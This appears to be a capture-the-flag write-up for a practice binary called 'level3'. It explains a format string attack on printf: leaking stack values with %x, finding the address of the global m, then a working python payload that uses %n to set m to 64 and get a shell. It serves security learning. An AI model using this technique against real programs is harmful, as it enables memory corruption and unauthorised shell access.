# level3
Unlike the previous level. `fgets` is used instead if `gets`. `fgets` is a safer function than `gets` because it takes a size parameter. The size parameter is the maximum number of characters to read. This prevents buffer overflow attacks.


## Goal
A global variable `m` is declared and supposed to be equal to zero. `v` function run a shell if `m` is equal to `64`

__We must change  value of `m` to `64`__

## Step 1
After `fgets` is done. printf is used to print the value returned by `fgets`

Yeah !! We can control the first parameter of `printf`. So we can make a __*format string attack*__. See [this video](https://www.youtube.com/watch?v=0WvrSfcdq1I) 

`int printf(const char *format, ...)` is a variadic function

As we can control the first parameter of `printf` we can use a __format string__  like `%x`. It will be search the next parameter in the __Ellipsis__ and print it as hexa.

Indeed `printf` is called with more parameters than wanted. And we know that parameters are placed on the stack before a function call.

> Finally: We have access to random value on the stack. It is leak of the stack


## Step 2
Try to access to `m` pointer by  insert multiple `%x` in the format string which will print the value of the stack. Successfully we access to `m` pointer as __fifth__ parameter of `printf`


``` bash
(python -c 'print "AAAA " + "%x %x %x %x"'; cat)  | /home/user/level3/level3
```
```console
AAAA 200 b7fd1ac0 b7ff37d0 41414141
```



## Step 3

Use the `%n` specifier. it will write the number of characters printed so far into the `int *` given. `m` in our case

see [stack overflow n specifier](https://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c)

`va_arg` will not access to `m` pointer but buffer pointer. So we must write `m` pointer in the buffer

``` bash


## Step 4 
Find address of `m`


``` bash
$ objdump -t level3
--- or ---
$ (gdb) p &m
--- or ---
$ (gdb) info variables
```

> `m` is at `0x0804988c`

## Exploit

```bash
(python -c 'print "\x8c\x98\x04\x08" + "%x%x%x" + "A" * 41 + "%n"'; cat)  | /home/user/level3/level3
```


- Write the address of `m` in the buffer accessed through the fifth paramter of printf
- Write 64 total characters
- Once printf accesses to `m` pointer inside the buffer. make a `%n` 


> 41 = 64 - nb_caracs_ever_printed.  
> It will write 64 in `m`